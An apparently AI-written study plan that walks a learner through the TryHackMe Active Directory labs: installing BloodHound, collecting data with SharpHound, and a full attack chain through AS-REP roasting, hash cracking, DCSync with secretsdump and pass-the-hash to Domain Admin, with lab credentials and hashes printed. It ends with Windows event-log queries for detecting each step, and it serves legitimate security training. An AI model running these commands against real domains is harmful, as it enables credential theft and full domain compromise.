

Since no labs are done yet — Day 5 becomes our **mega lab day** where we do everything together, step by step. I'll guide every single command.

And since you're using TryHackMe/HTB — let me find the best free rooms right now. 🎯Got everything I need! Here's your complete Day 5 plan. 🎯

---

# 🔵 PHASE 1 — DAY 5
# Hands-On Labs — BloodHound + Full Attack Simulation
### *Today we stop reading about attacks. We do them.*

---

## 🗺️ DAY 5 GAME PLAN

```
TODAY'S STRUCTURE:
══════════════════════════════════════════════════════════
PART 1 — Install BloodHound on Kali (30 min)
PART 2 — TryHackMe: Enumerating AD with BloodHound (45 min)
PART 3 — TryHackMe: Attacktive Directory (60 min)
          Full attack chain: enumeration → Kerberoasting
          → secretsdump → Pass-the-Hash → Domain Admin
PART 4 — Blue Team: Catch what you just did (30 min)
          Detect your own attack in logs
PART 5 — Catch-up: Previous labs backlog (remaining time)
══════════════════════════════════════════════════════════

TryHackMe Rooms We're Using Today:
✅ "Enumerating Active Directory" — FREE
✅ "Attacktive Directory"         — FREE
✅ "Post-Exploitation Basics"     — FREE

All three together = complete attack chain
```

---

## 📌 PART 1 of 5
## Install BloodHound on Kali — Step by Step

---

### What is BloodHound?

```
SIMPLE EXPLANATION:
─────────────────────────────────────────────────────────
BloodHound maps Active Directory like Google Maps.

It shows:
→ Every user, group, computer in the domain
→ WHO has admin rights over WHAT
→ Hidden attack paths from low-privilege to Domain Admin
→ Misconfigurations invisible to normal admins

Example output:
"Gani → member of HelpDesk → HelpDesk has GenericWrite
 on SQLAdmins group → SQLAdmins has admin on SQLDB01
 → SQLDB01 has session of hareesh-t0 → Domain Admin"

That path = 4 hops from Gani to Domain Admin
BloodHound finds it in seconds.
Hareesh as admin would never see this manually.
─────────────────────────────────────────────────────────

TWO COMPONENTS:
1. SharpHound (collector) — runs on Windows domain machine
   → Collects ALL AD data → outputs ZIP file

2. BloodHound (GUI)       — runs on Kali
   → Imports ZIP → shows attack paths visually
   → Uses Neo4j graph database underneath
```

### Installation on Kali

```bash
# ══════════════════════════════════════════════════════
# STEP 1 — Update Kali first:
# ══════════════════════════════════════════════════════
sudo apt update && sudo apt upgrade -y

# ══════════════════════════════════════════════════════
# STEP 2 — Install BloodHound and Neo4j:
# ══════════════════════════════════════════════════════
sudo apt install bloodhound neo4j -y

# This installs:
# neo4j    = graph database (stores AD relationship data)
# bloodhound = the GUI application

# ══════════════════════════════════════════════════════
# STEP 3 — Start Neo4j database:
# ══════════════════════════════════════════════════════
sudo neo4j start

# Wait 30 seconds for it to start, then open browser:
# URL: http://localhost:7474

# Default credentials:
# Username: neo4j
# Password: neo4j

# It will FORCE you to change the password on first login
# Set it to something memorable: bloodhound123
# (This is a local lab — not production!)

# ══════════════════════════════════════════════════════
# STEP 4 — Launch BloodHound:
# ══════════════════════════════════════════════════════
bloodhound &

# Login screen appears:
# Database URL: bolt://localhost:7687
# Username: neo4j
# Password: bloodhound123 (whatever you set above)

# ══════════════════════════════════════════════════════
# STEP 5 — Verify it works:
# ══════════════════════════════════════════════════════
# BloodHound GUI should open
# It will look empty — no data yet
# That's correct — data comes from SharpHound collector

# If BloodHound fails to launch:
sudo apt install --fix-broken
sudo apt install bloodhound -y --reinstall

# If Neo4j won't start:
sudo systemctl status neo4j
sudo systemctl start neo4j
sudo journalctl -u neo4j -n 50  # check errors
```

> ⚠️ **Common issue:** If Neo4j says port 7474 already in use — another instance is running. Run `sudo systemctl stop neo4j` then `sudo neo4j start` again.

---

## 📌 PART 2 of 5
## TryHackMe — Enumerating Active Directory with BloodHound

---

### Room Setup

```
ROOM: "Enumerating Active Directory"
URL:  tryhackme.com/room/adenumeration
COST: FREE
TIME: 45 minutes

WHAT YOU'LL DO:
→ Connect to TryHackMe VPN
→ Get low-privilege domain credentials
→ Run SharpHound to collect AD data
→ Import into BloodHound
→ Find attack paths visually
→ Identify Kerberoastable accounts
```

### Step-by-Step Guide

**STEP 1 — Connect to TryHackMe VPN**

```bash
# Download your VPN config from TryHackMe:
# tryhackme.com → Access → Download OpenVPN config

# Connect:
sudo openvpn --config ~/Downloads/yourname.ovpn

# Verify connected:
ip a | grep tun0
# Should show a 10.x.x.x IP address

# Keep this terminal open — VPN must stay running
```

**STEP 2 — Configure DNS for the Lab**

```bash
# The domain in this room is: za.tryhackme.com
# Set DNS to point to the lab DC:

# Find the DC IP from the room instructions
# Usually shown when you deploy the machine

# Set DNS temporarily:
sudo bash -c 'echo "nameserver <DC_IP>" > /etc/resolv.conf'

# Test DNS works:
nslookup thmdc.za.tryhackme.com
# Should return the DC's IP address
```

**STEP 3 — Run SharpHound Collector**

```powershell
# TryHackMe provides SSH or RDP access to a domain machine
# Connect using provided credentials

# SSH into the jump host:
ssh <username>@thmjmp1.za.tryhackme.com
# Password provided in the room

# Once connected — launch PowerShell:
powershell -ep bypass

# Download SharpHound:
Invoke-WebRequest `
  -Uri "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe" `
  -OutFile "SharpHound.exe"

# Run SharpHound to collect ALL AD data:
.\SharpHound.exe --CollectionMethods All `
                 --Domain za.tryhackme.com `
                 --ExcludeDCs

# SharpHound Output:
# -----------------------------------------------
# Initializing SharpHound at 9:00 AM
# -----------------------------------------------
# [+] Resolved Collection Methods: Group, Sessions,
#     LoggedOn, Trusts, ACL, ObjectProps...
# Status: 0 objects finished (+0) -- Using 72 MB RAM
# Status: 104 objects finished (+104 2.4/s)
# [+] Enumeration finished in 00:00:43
# [+] Saving cache...
# [+] Output: 20260405_BloodHound.zip  ← THIS FILE

# The ZIP contains all AD relationship data
```

**STEP 4 — Transfer ZIP to Kali**

```bash
# In a NEW Kali terminal:
scp <username>@thmjmp1.za.tryhackme.com:\
  "C:/Users/<username>/Documents/20260405_BloodHound.zip" \
  ~/Desktop/

# Verify file received:
ls -la ~/Desktop/*.zip
# Should show the BloodHound ZIP file
```

**STEP 5 — Import into BloodHound**

```
IN BLOODHOUND GUI:
─────────────────────────────────────────────────────────
1. BloodHound is open and you're logged in

2. Look for the upload button:
   → Right side panel → Upload Data button
   → OR drag and drop the ZIP file directly onto BloodHound

3. Watch the import:
   "Importing... Users: 534, Computers: 87, Groups: 113"
   → When complete → "Finished!"

4. Now you have a full AD map in front of you
```

**STEP 6 — Find Attack Paths in BloodHound**

```
BLOODHOUND BUILT-IN QUERIES — RUN THESE:
─────────────────────────────────────────────────────────
Click: Analysis tab (left panel)

QUERY 1 — Find All Domain Admin Paths:
→ "Find Shortest Paths to Domain Admins"
→ Shows every possible path from any user to Domain Admin
→ This is what attackers run first

QUERY 2 — Find Kerberoastable Accounts:
→ "List all Kerberoastable Accounts"
→ Shows accounts with SPNs = crackable
→ Red nodes = high value targets

QUERY 3 — Find AS-REP Roastable Users:
→ "Find AS-REP Roastable Users (DontReqPreAuth)"
→ These accounts don't need a password to request a ticket!

QUERY 4 — Find Principals with DCSync Rights:
→ "Find Principals with DCSync Rights"
→ Who can run DCSync? Should be ONLY DCs

QUERY 5 — Shortest Path to DA from Owned:
→ Right-click any node → Mark as Owned
→ Run: "Shortest Paths to Domain Admins from Owned"
→ Shows your exact attack path

WHAT YOU'RE LOOKING FOR:
→ Any non-admin user with path to Domain Admin
→ Any service account with SPN (Kerberoastable)
→ Any user with DCSync rights
→ Any computer with unconstrained delegation
```

---

## 📌 PART 3 of 5
## TryHackMe — Attacktive Directory
### *The Full Attack Chain — Beginner to Domain Admin*

---

```
ROOM: "Attacktive Directory"
URL:  tryhackme.com/room/attacktivedirectory
COST: FREE
TIME: 60 minutes
DOMAIN: spookysec.local

ATTACK CHAIN YOU'LL EXECUTE:
─────────────────────────────────────────────────────────
PHASE 1: Enumeration
  → Nmap scan → find open ports
  → Kerbrute → find valid usernames
  → Find: svc-admin account (service account!)
  → Find: backup account

PHASE 2: AS-REP Roasting
  → svc-admin has "Do not require Kerberos pre-auth"
  → Request hash WITHOUT needing password
  → Crack hash with Hashcat → get password

PHASE 3: SMB Enumeration
  → Use svc-admin credentials → list SMB shares
  → Find interesting share with sensitive data
  → Find backup credentials file

PHASE 4: DCSync / secretsdump
  → Use backup account credentials
  → Run secretsdump.py → dump ALL hashes from DC
  → Get Administrator NTLM hash

PHASE 5: Pass-the-Hash
  → Use Administrator hash → Evil-WinRM
  → Full Domain Admin shell
  → Game over
─────────────────────────────────────────────────────────
```

### Phase 1 — Enumeration

```bash
# ══════════════════════════════════════════════════════
# Set your target IP (from TryHackMe room):
TARGET=<machine_IP>

# STEP 1 — Nmap scan:
nmap -sV -sC -p- --min-rate 5000 $TARGET

# Key ports to find:
# 88   → Kerberos  (confirms it's a DC)
# 139  → NetBIOS
# 389  → LDAP
# 445  → SMB
# 3268 → Global Catalog
# 3389 → RDP

# STEP 2 — Install Kerbrute (username enumerator):
wget https://github.com/ropnop/kerbrute/releases/latest/\
download/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
sudo mv kerbrute /usr/local/bin/

# STEP 3 — Download username wordlist provided by room:
# (Room provides a wordlist — download from task)

# STEP 4 — Enumerate valid usernames:
kerbrute userenum \
  --dc $TARGET \
  --domain spookysec.local \
  userlist.txt

# OUTPUT:
# [+] VALID USERNAME: james@spookysec.local
# [+] VALID USERNAME: svc-admin@spookysec.local  ← service acct!
# [+] VALID USERNAME: James@spookysec.local
# [+] VALID USERNAME: robin@spookysec.local
# [+] VALID USERNAME: darkstar@spookysec.local
# [+] VALID USERNAME: backup@spookysec.local     ← backup acct!
# [+] VALID USERNAME: administrator@spookysec.local

# Save these usernames for next phase
```

### Phase 2 — AS-REP Roasting

```bash
# AS-REP Roasting = like Kerberoasting but different
# Target: accounts with "Do not require pre-auth" enabled
# These accounts give you a hash WITHOUT needing credentials

# STEP 1 — Request hash for vulnerable accounts:
impacket-GetNPUsers spookysec.local/svc-admin \
  -no-pass \
  -dc-ip $TARGET

# OUTPUT:
# $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:
# a3b2c1d4e5f6...  ← AS-REP hash

# Save to file:
impacket-GetNPUsers spookysec.local/svc-admin \
  -no-pass \
  -dc-ip $TARGET \
  -outputfile asrep_hash.txt

cat asrep_hash.txt

# STEP 2 — Crack the hash with Hashcat:
hashcat -m 18200 asrep_hash.txt \
  /usr/share/wordlists/rockyou.txt \
  --force

# -m 18200 = AS-REP hash type
# (different from Kerberoasting which is 13100)

# Wait a few minutes...

# OUTPUT:
# $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...:management2005
#                                               ↑ CRACKED!

# svc-admin password = management2005
```

### Phase 3 — SMB Enumeration with Stolen Credentials

```bash
# Now we have: svc-admin / management2005
# Let's see what SMB shares are accessible

# STEP 1 — List SMB shares:
smbclient -L //$TARGET \
  -U spookysec.local\\svc-admin%management2005

# OUTPUT:
# Sharename    Type   Comment
# ─────────────────────────────────
# ADMIN$       Disk   Remote Admin
# backup       Disk   ← INTERESTING!
# C$           Disk   Default share
# IPC$         IPC    Remote IPC
# NETLOGON     Disk   Logon server share
# SYSVOL       Disk   Logon server share

# STEP 2 — Access the backup share:
smbclient //$TARGET/backup \
  -U spookysec.local\\svc-admin%management2005

# SMB shell:
smb: \> ls
# backup_credentials.txt  ← Found it!

smb: \> get backup_credentials.txt
smb: \> exit

# STEP 3 — Read the file:
cat backup_credentials.txt
# YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

# Looks like Base64! Decode it:
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" \
  | base64 -d

# OUTPUT:
# backup@spookysec.local:backup2517860
# ↑ username                ↑ password
```

### Phase 4 — DCSync (secretsdump)

```bash
# backup account has special replication privileges
# We can DCSync the entire domain!

impacket-secretsdump \
  spookysec.local/backup:backup2517860@$TARGET

# OUTPUT — ALL HASHES DUMPED:
# Administrator:500:aad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
# Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
# ↑ This is the KRBTGT hash → Golden Ticket possible!
# svc-admin:1103:aad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
# backup:1104:aad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::

# Administrator NTLM hash:
# 0e0363213e37b94221497260b0bcb4fc

# Save this hash — using it next
```

### Phase 5 — Pass-the-Hash → Domain Admin

```bash
# We have the Administrator NTLM hash
# No need to crack it — just USE it directly!

# Evil-WinRM = WinRM shell using hash
# Install if not present:
gem install evil-winrm

# Pass-the-Hash attack:
evil-winrm -i $TARGET \
  -u Administrator \
  -H 0e0363213e37b94221497260b0bcb4fc

# OUTPUT:
# Evil-WinRM shell v3.4
# Info: Establishing connection to remote endpoint
# *Evil-WinRM* PS C:\Users\Administrator\Documents>

# YOU ARE NOW DOMAIN ADMIN! 🎯

# Verify:
whoami
# spookysec\administrator

whoami /groups
# Shows: Domain Admins ✅

# Get the flags:
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\backup\Desktop\PrivEsc.txt
type C:\Users\svc-admin\Desktop\user.txt.txt
```

---

## 📌 PART 4 of 5
## Blue Team — Detect Your Own Attack

---

This is what makes Day 5 special. You just attacked. Now **be Navi** and catch yourself.

```
WHAT YOUR ATTACK LEFT BEHIND:
══════════════════════════════════════════════════════════
Attack Phase          Evidence Left            Event ID
──────────────────────────────────────────────────────────
Kerbrute enumeration  Failed Kerberos requests  4771
                      Username doesn't exist    4768 (0x6)

AS-REP Roasting       TGT requested,no preauth  4768
                      Encryption type 0x17      4768

SMB enumeration       Network share access      5140
                      File accessed             4663

secretsdump (DCSync)  Replication requested     4662
                      From non-DC machine       4662

Evil-WinRM PtH        Network login Type 3      4624
                      NTLM authentication       4624
                      New process creation      4688
══════════════════════════════════════════════════════════
```

```powershell
# If you have your own Azure DC01 — run these queries
# to see what your attack would have looked like:

# Find AS-REP Roasting evidence:
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  Id = 4768
} -MaxEvents 20 | ForEach-Object {
  [PSCustomObject]@{
    Time           = $_.TimeCreated
    Account        = $_.Properties[0].Value
    EncryptionType = $_.Properties[8].Value
    PreAuthType    = $_.Properties[7].Value
    SourceIP       = $_.Properties[9].Value
  }
} | Where-Object {
  $_.PreAuthType -eq "0"  # 0 = no pre-auth required
} | Format-Table -AutoSize

# Find DCSync evidence:
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  Id = 4662
} -MaxEvents 20 | ForEach-Object {
  $props = $_.Properties
  [PSCustomObject]@{
    Time      = $_.TimeCreated
    Account   = $props[1].Value
    Operation = $props[8].Value
    Object    = $props[4].Value
  }
} | Where-Object {
  $_.Operation -match "1131f6aa|1131f6ab"
} | Format-Table -AutoSize
```

---

## 📌 PART 5 of 5
## Catch-Up Labs — All Previous Days

---

Since all previous labs are pending — here's your priority order:

```
PRIORITY ORDER FOR CATCH-UP:
══════════════════════════════════════════════════════════
TODAY (after Attacktive Directory):
──────────────────────────────────────────────────────────
✅ Day 5 — BloodHound install (Part 1 above)
✅ Day 5 — TryHackMe Attacktive Directory (Part 3 above)

THIS WEEKEND:
──────────────────────────────────────────────────────────
□ Day 2 Lab — klist command (5 min):
  On any Windows machine:
  klist
  klist purge
  klist  (should be empty)

□ Day 2 Lab — Create Gani's account (10 min):
  New-ADUser -Name "Gani" -SamAccountName "gani" ...
  (commands in Day 2 notes)

□ Day 3 Lab — Audit policy (15 min):
  auditpol /set /subcategory:"Credential Validation"
           /success:enable /failure:enable
  auditpol /get /category:*

□ Day 4 Lab — Failed login detection (15 min):
  Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625}
  Trigger 6 failed logins → detect with PowerShell

□ Day 4 Lab — HTB Sherlock Camp Fire 1 (45 min):
  app.hackthebox.com/sherlocks → "Camp Fire 1"
  FREE + guided mode

□ Day 4 Lab — CyberDefenders DetectiveAD (45 min):
  cyberdefenders.org → search "DetectiveAD"
  FREE + log analysis

NEXT WEEK:
──────────────────────────────────────────────────────────
□ Kerberoasting live in Azure lab (from Day 3 guide)
□ TryHackMe: Enumerating Active Directory (Part 2 above)
□ TryHackMe: Post-Exploitation Basics (BloodHound + Mimikatz)
══════════════════════════════════════════════════════════
```

---

## 📋 DAY 5 — COMPLETE NOTES

```
╔══════════════════════════════════════════════════════════╗
║      DAY 5 — HANDS-ON LABS: BLOODHOUND + ATTACK SIM     ║
║                    SecureCorp Ltd.                       ║
╚══════════════════════════════════════════════════════════╝

BLOODHOUND:
─────────────────────────────────────────────────────────
Components:
  SharpHound → collector (runs on Windows domain machine)
               outputs ZIP file with all AD relationships
  BloodHound → GUI (runs on Kali, needs Neo4j database)
               imports ZIP, shows visual attack paths

Installation:
  sudo apt install bloodhound neo4j -y
  sudo neo4j start
  → Set password at http://localhost:7474
  bloodhound &
  → Login with neo4j credentials

Key BloodHound Queries:
  → Shortest Paths to Domain Admins
  → List all Kerberoastable Accounts
  → Find AS-REP Roastable Users
  → Find Principals with DCSync Rights
  → Shortest Path to DA from Owned

ATTACKTIVE DIRECTORY — FULL ATTACK CHAIN:
─────────────────────────────────────────────────────────
Phase 1 — Enumeration:
  Tool: Kerbrute
  kerbrute userenum --dc <IP> --domain spookysec.local users.txt
  Found: svc-admin, backup, administrator

Phase 2 — AS-REP Roasting:
  Tool: Impacket GetNPUsers
  impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip <IP>
  Got: $krb5asrep$23$ hash
  Cracked with: hashcat -m 18200
  Password: management2005

Phase 3 — SMB Enumeration:
  Tool: smbclient
  smbclient -L //<IP> -U svc-admin%management2005
  Found: backup share → backup_credentials.txt
  Decoded Base64 → backup:backup2517860

Phase 4 — DCSync:
  Tool: impacket-secretsdump
  impacket-secretsdump spookysec.local/backup:backup2517860@<IP>
  Got: ALL NTLM hashes including Administrator
  Administrator hash: 0e0363213e37b94221497260b0bcb4fc

Phase 5 — Pass-the-Hash:
  Tool: Evil-WinRM
  evil-winrm -i <IP> -u Administrator -H <hash>
  Result: Domain Admin shell ✅

ATTACK vs DEFENCE MAPPING:
─────────────────────────────────────────────────────────
Kerbrute enum      → 4771 failures, 4768 errors (code 0x6)
AS-REP Roasting    → 4768 with PreAuthType = 0
SMB access         → 5140 (share accessed), 4663 (file)
DCSync             → 4662 with replication GUIDs, non-DC
Pass-the-Hash      → 4624 Type 3 + NTLM auth

KEY TOOLS USED TODAY:
─────────────────────────────────────────────────────────
kerbrute           → Username enumeration via Kerberos
impacket-GetNPUsers → AS-REP Roasting
hashcat -m 18200   → Crack AS-REP hashes
smbclient          → SMB share enumeration
impacket-secretsdump → DCSync / hash dumping
evil-winrm         → WinRM shell via Pass-the-Hash
BloodHound         → AD attack path visualization
SharpHound         → AD data collector for BloodHound

DIFFERENCE: AS-REP vs Kerberoasting:
─────────────────────────────────────────────────────────
Kerberoasting:
  → Need valid credentials first
  → Request SERVICE ticket (TGS)
  → Hash type: $krb5tgs$23$ (hashcat -m 13100)
  → Target: accounts WITH SPNs

AS-REP Roasting:
  → Need NO credentials at all
  → Request USER ticket (TGT)
  → Hash type: $krb5asrep$23$ (hashcat -m 18200)
  → Target: accounts with pre-auth DISABLED

TRYHACKME ROOMS COMPLETED:
─────────────────────────────────────────────────────────
□ Enumerating Active Directory (BloodHound section)
□ Attacktive Directory (full attack chain)
□ Post-Exploitation Basics (optional — BloodHound + Mimikatz)

PENDING CATCH-UP LABS:
─────────────────────────────────────────────────────────
□ Day 2: klist, Gani account creation
□ Day 3: Audit policy, Protected Users
□ Day 4: Failed login detection, Camp Fire 1, DetectiveAD
□ Azure Lab: Live Kerberoasting attack + gMSA defense
```

---

## 🚀 START RIGHT NOW

Here's exactly what to do in the next 5 minutes:

```
IMMEDIATE ACTION PLAN:
─────────────────────────────────────────────────────────
Terminal 1 — Install BloodHound:
  sudo apt install bloodhound neo4j -y

Terminal 2 — Open TryHackMe:
  Browser → tryhackme.com
  → Search "Attacktive Directory"
  → Deploy the machine
  → Note the IP

While BloodHound installs (~5 min):
  → Start the Attacktive Directory room
  → Read Task 1 and Task 2
  → Start your Nmap scan

When BloodHound finishes installing:
  → sudo neo4j start
  → Set password at localhost:7474
  → bloodhound &
─────────────────────────────────────────────────────────
```

---

> 💡 **Senior Engineer's Truth:** *"The day I ran secretsdump for the first time in a legal lab and saw EVERY hash in the domain dump to my screen in 3 seconds — I understood why AD security is so critical. That moment changes how you think forever. You stop being an IT admin who sets up services. You become a security professional who understands what's at stake. Today is that day for you."*

---
